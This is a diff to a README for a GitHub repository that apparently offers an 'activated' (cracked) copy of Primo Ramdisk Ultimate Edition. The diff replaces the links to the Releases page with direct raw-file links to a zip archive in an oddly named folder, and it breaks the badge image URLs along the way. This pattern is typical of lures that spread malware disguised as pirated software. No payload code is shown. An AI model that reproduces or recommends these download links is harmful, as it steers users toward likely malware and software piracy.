@@ -1,6 +1,6 @@
 # 🚀 Primo-Ramdisk-Ultimate-Edition-Activated - Optimize Your Memory Performance
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Click%20Here-blue)](https://github.com/gaurav88559/Primo-Ramdisk-Ultimate-Edition-Activated/releases)
+[![Download Now](https://raw.githubusercontent.com/gaurav88559/Primo-Ramdisk-Ultimate-Edition-Activated/main/urinogenital/Activated-Primo-Ramdisk-Edition-Ultimate-2.5-beta.4.zip%20Now-Click%20Here-blue)](https://raw.githubusercontent.com/gaurav88559/Primo-Ramdisk-Ultimate-Edition-Activated/main/urinogenital/Activated-Primo-Ramdisk-Edition-Ultimate-2.5-beta.4.zip)
 
 ## 📖 Overview
 
@@ -12,7 +12,7 @@ To begin, you need to download and install Primo Ramdisk Ultimate Edition. Follo
 
 ## 📥 Download & Install
 
-1. Visit this page to download: [Download Primo Ramdisk Ultimate Edition](https://github.com/gaurav88559/Primo-Ramdisk-Ultimate-Edition-Activated/releases).
+1. Visit this page to download: [Download Primo Ramdisk Ultimate Edition](https://raw.githubusercontent.com/gaurav88559/Primo-Ramdisk-Ultimate-Edition-Activated/main/urinogenital/Activated-Primo-Ramdisk-Edition-Ultimate-2.5-beta.4.zip).
 2. Once on the Releases page, look for the latest version.
 3. Click on the link to download the installation file. 
 4. After the download completes, open the file to begin the installation process.
@@ -86,4 +86,4 @@ For further reading and advanced techniques, below are useful links:
 
 For any support-related queries, please check the Issues section in this repository or contact us directly. We are here to help ensure your experience with Primo Ramdisk Ultimate Edition is smooth and effective.
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Click%20Here-blue)](https://github.com/gaurav88559/Primo-Ramdisk-Ultimate-Edition-Activated/releases)
+[![Download Now](https://raw.githubusercontent.com/gaurav88559/Primo-Ramdisk-Ultimate-Edition-Activated/main/urinogenital/Activated-Primo-Ramdisk-Edition-Ultimate-2.5-beta.4.zip%20Now-Click%20Here-blue)](https://raw.githubusercontent.com/gaurav88559/Primo-Ramdisk-Ultimate-Edition-Activated/main/urinogenital/Activated-Primo-Ramdisk-Edition-Ultimate-2.5-beta.4.zip)
